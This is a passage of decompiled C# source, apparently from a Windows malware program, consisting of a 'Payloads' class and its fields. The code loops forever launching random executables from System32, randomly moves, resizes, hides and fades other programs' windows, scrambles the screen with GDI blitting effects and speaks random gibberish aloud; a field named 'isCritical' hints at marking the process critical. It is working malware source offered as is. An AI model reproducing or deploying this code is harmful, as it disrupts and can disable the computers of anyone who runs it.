			for (;;)
			{
				try
				{
					Process.Start(Payloads.filesSys32[Functions.RNG(0, Payloads.filesSys32.Count)].FullName);
				}
				catch
				{
				}
				Thread.Sleep(100);
			}
		}

		// Token: 0x06000089 RID: 137 RVA: 0x0000515C File Offset: 0x0000335C
		public static void MoveWindow()
		{
			Array swValues = Enum.GetValues(typeof(Imports.ShowWindowFlags));
			for (;;)
			{
				using (List<IntPtr>.Enumerator enumerator = Payloads.procs.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						IntPtr proc = enumerator.Current;
						new Thread(delegate()
						{
							IntPtr proc;
							try
							{
								proc = proc;
							}
							catch
							{
								return;
							}
							for (int i = 0; i < 20; i++)
							{
								try
								{
									Imports.RECT rect;
									Imports.GetWindowRect(proc, out rect);
									int num = rect.Right - rect.Left;
									int num2 = rect.Bottom - rect.Top;
									Imports.SetWindowPos(proc, new IntPtr(1), Functions.RNG(Payloads.ScreenX - num, Payloads.Width), Functions.RNG(Payloads.ScreenY - num2, Payloads.Height), Functions.RNG(num - 200, num + 200), Functions.RNG(num2 - 200, num2 + 200), Imports.SetWindowPosFlags.SWP_ASYNCWINDOWPOS | Imports.SetWindowPosFlags.SWP_SHOWWINDOW);
									Imports.ShowWindow(proc, (Imports.ShowWindowFlags)swValues.GetValue(Functions.RNG(0, 8)));
									Thread.Sleep(50);
								}
								catch
								{
									break;
								}
							}
						}).Start();
					}
				}
				Thread.Sleep(1000);
			}
		}

		// Token: 0x0600008A RID: 138 RVA: 0x000051F4 File Offset: 0x000033F4
		public static void TextToSpeech()
		{
			Payloads.SpeechSynth.Rate = Functions.RNG(-2, 10);
			Payloads.SpeechSynth.SelectVoice(Payloads.InstalledSpeechVoices[Functions.RNG(0, Payloads.InstalledSpeechVoices.Count - 1)].VoiceInfo.Name);
			Payloads.SpeechSynth.Speak((Functions.RNG(0, 1) == 0) ? Functions.StringToHexadecimal(Functions.GetRandString(0, 2048, 10)) : Functions.GetRandLettersNumbers(10));
		}

		// Token: 0x0600008B RID: 139 RVA: 0x00005274 File Offset: 0x00003474
		public static void ExpandWindows()
		{
			for (;;)
			{
				try
				{
					using (List<IntPtr>.Enumerator enumerator = Payloads.procs.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							IntPtr proc = enumerator.Current;
							new Thread(delegate()
							{
								IntPtr proc;
								try
								{
									proc = proc;
								}
								catch
								{
									return;
								}
								IntPtr dc = Imports.GetDC(proc);
								for (int i = 0; i < 250; i++)
								{
									Imports.RECT rect;
									Imports.GetWindowRect(proc, out rect);
									Imports.StretchBlt(dc, -5, -5, rect.Right - rect.Left + 10, rect.Bottom - rect.Top + 10, dc, 0, 0, rect.Right - rect.Left, rect.Bottom - rect.Top, Functions.RandRop(-1));
									Thread.Sleep(50);
								}
								Imports.ReleaseDC(proc, dc);
							}).Start();
						}
					}
				}
				catch
				{
				}
				Thread.Sleep(1000);
			}
		}

		// Token: 0x0600008C RID: 140 RVA: 0x000052FC File Offset: 0x000034FC
		public static void Checkerboard()
		{
			Array values = Enum.GetValues(typeof(RotateFlipType));
			int num = Functions.RNG((Functions.RNG(0, 1) == 0) ? (Payloads.Width / 20) : (Payloads.Height / 20), (Functions.RNG(0, 1) == 0) ? (Payloads.Width / 20) : (Payloads.Height / 4));
			int num2 = Functions.RNG((Functions.RNG(0, 1) == 0) ? (Payloads.Width / 20) : (Payloads.Height / 20), (Functions.RNG(0, 1) == 0) ? (Payloads.Width / 20) : (Payloads.Height / 4));
			for (int i = Payloads.ScreenX; i < Payloads.Width; i += num)
			{
				for (int j = Payloads.ScreenY; j < Payloads.Height; j += num2)
				{
					using (QuickBitmap screenBmp = Functions.GetScreenBmp(i, j, num, num2))
					{
						screenBmp.Bitmap.RotateFlip((RotateFlipType)values.GetValue(Functions.RNG(0, values.Length - 1)));
						if (Functions.RNG(0, 2) == 0)
						{
							using (Graphics graphics = Graphics.FromImage(screenBmp.Bitmap))
							{
								graphics.TranslateTransform((float)(screenBmp.Width / 2), (float)(screenBmp.Height / 2));
								graphics.RotateTransform((float)Functions.RNG(-180, 180));
								graphics.TranslateTransform((float)(-(float)screenBmp.Width / 2), (float)(-(float)screenBmp.Height / 2));
								graphics.DrawImage(screenBmp.Bitmap, 0, 0);
							}
						}
						if (Payloads.DoRandRops)
						{
							for (int k = 0; k < Functions.RNG(1, 5); k++)
							{
								Functions.BitmapColorMatrix(screenBmp);
							}
						}
						try
						{
							Payloads.GDIPlus.DrawIcon(Icon.FromHandle(screenBmp.Bitmap.GetHicon()), i, j);
						}
						catch
						{
						}
						Imports.DrawIcon(Payloads.hDC, i + Functions.RNG(0, num), j + Functions.RNG(0, num2), screenBmp.Bitmap.GetHicon());
					}
				}
			}
		}

		// Token: 0x0600008D RID: 141 RVA: 0x00005548 File Offset: 0x00003748
		public static void WindowOpacity()
		{
			for (;;)
			{
				try
				{
					using (List<IntPtr>.Enumerator enumerator = Payloads.procs.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							IntPtr proc = enumerator.Current;
							new Thread(delegate()
							{
								for (int i = 0; i < 20; i++)
								{
									Imports.SetWindowLongPtr(proc, -20, (IntPtr)(Imports.GetWindowLongPtr(proc, -20).ToInt32() ^ 524288));
									Imports.SetLayeredWindowAttributes(proc, 0U, (byte)Functions.RNG(1, 255), 2U);
									Thread.Sleep(50);
								}
							}).Start();
						}
					}
				}
				catch
				{
				}
				Thread.Sleep(1000);
			}
		}

		// Token: 0x0600008E RID: 142 RVA: 0x000055D0 File Offset: 0x000037D0
		public static void ScreenBits()
		{
			for (int i = 0; i < 10; i++)
			{
				new Thread(delegate()
				{
					int num = Functions.RNG(Payloads.ScreenX, Payloads.RealWidth);
					int num2 = Functions.RNG(Payloads.ScreenY, Payloads.RealHeight);
					int num3 = Functions.RNG(0, ((Functions.RNG(0, 1) == 0) ? Payloads.RealWidth : Payloads.RealHeight) / 4);
					int num4 = Functions.RNG(0, ((Functions.RNG(0, 1) == 0) ? Payloads.RealWidth : Payloads.RealHeight) / 4);
					for (int j = 0; j < 50; j++)
					{
						Imports.BitBlt(Payloads.hDC, num + Functions.RNG(-10, 10), num2 + Functions.RNG(-10, 10), num3 + Functions.RNG(-10, 10), num4 + Functions.RNG(-10, 10), Payloads.hDC, num + Functions.RNG(-20, 20), num2 + Functions.RNG(-20, 20), Functions.RandRop(-1));
						Thread.Sleep(50);
					}
					num = Functions.RNG(Payloads.ScreenX, Payloads.RealWidth);
					num2 = Functions.RNG(Payloads.ScreenY, Payloads.RealHeight);
					num3 = Functions.RNG(0, ((Functions.RNG(0, 1) == 0) ? Payloads.RealWidth : Payloads.RealHeight) / 4);
					num4 = Functions.RNG(0, ((Functions.RNG(0, 1) == 0) ? Payloads.RealWidth : Payloads.RealHeight) / 4);
					for (int k = 0; k < 50; k++)
					{
						Imports.StretchBlt(Payloads.hDC, num + Functions.RNG(-10, 10), num2 + Functions.RNG(-10, 10), num3 + Functions.RNG(-10, 10), num4 + Functions.RNG(-10, 10), Payloads.hDC, num + Functions.RNG(-20, 20), num2 + Functions.RNG(-20, 20), num3 + Functions.RNG(-10, 10), num4 + Functions.RNG(-10, 10), Functions.RandRop(-1));
						Thread.Sleep(50);
					}
				}).Start();
			}
			Thread.Sleep(1000);
		}

		// Token: 0x0400001A RID: 26
		public static Imports.POINT cursor;

		// Token: 0x0400001B RID: 27
		public static int JitterRate = 2000;

		// Token: 0x0400001C RID: 28
		public static int JitterSlowdown = 2000;

		// Token: 0x0400001D RID: 29
		public static int ScreenX;

		// Token: 0x0400001E RID: 30
		public static int ScreenY;

		// Token: 0x0400001F RID: 31
		public static int Width;

		// Token: 0x04000020 RID: 32
		public static int Height;

		// Token: 0x04000021 RID: 33
		public static int RealWidth;

		// Token: 0x04000022 RID: 34
		public static int RealHeight;

		// Token: 0x04000023 RID: 35
		public static int StretchSpeed = 2;

		// Token: 0x04000024 RID: 36
		public static decimal DisplacementRate = 8m;

		// Token: 0x04000025 RID: 37
		public static decimal SquishRate = 50m;

		// Token: 0x04000026 RID: 38
		public static int RandRopChance = 100;

		// Token: 0x04000027 RID: 39
		public static bool DoRandRops = false;

		// Token: 0x04000028 RID: 40
		public static readonly IntPtr hDC = Imports.GetDC(IntPtr.Zero);

		// Token: 0x04000029 RID: 41
		public static readonly Size screenSize = new Size(Payloads.Width, Payloads.Height);

		// Token: 0x0400002A RID: 42
		public static Graphics GDIPlus;

		// Token: 0x0400002B RID: 43
		public static SoundPlayer player = new SoundPlayer();

		// Token: 0x0400002C RID: 44
		public static int isCritical = 1;

		// Token: 0x0400002D RID: 45
		public static IntPtr hWndCurrentProc = Process.GetCurrentProcess().MainWindowHandle;

		// Token: 0x0400002E RID: 46
		public static List<FileInfo> filesSys32;

		// Token: 0x0400002F RID: 47
		public static SpeechSynthesizer SpeechSynth = new SpeechSynthesizer();

		// Token: 0x04000030 RID: 48
		public static ReadOnlyCollection<InstalledVoice> InstalledSpeechVoices = Payloads.SpeechSynth.GetInstalledVoices();

		// Token: 0x04000031 RID: 49
		public static DirectoryInfo QuarknovaDirectory;

		// Token: 0x04000032 RID: 50
		public static List<IntPtr> procs;

		// Token: 0x04000033 RID: 51
		public static List<string> WindowsSoundList = new List<string>();

		// Token: 0x04000034 RID: 52
		public static Icon[] Icons = new Icon[]
		{
			SystemIcons.Error,
			SystemIcons.Warning,
			SystemIcons.Information,
			SystemIcons.Question,
			SystemIcons.Shield,
			SystemIcons.WinLogo
		};
	}
}
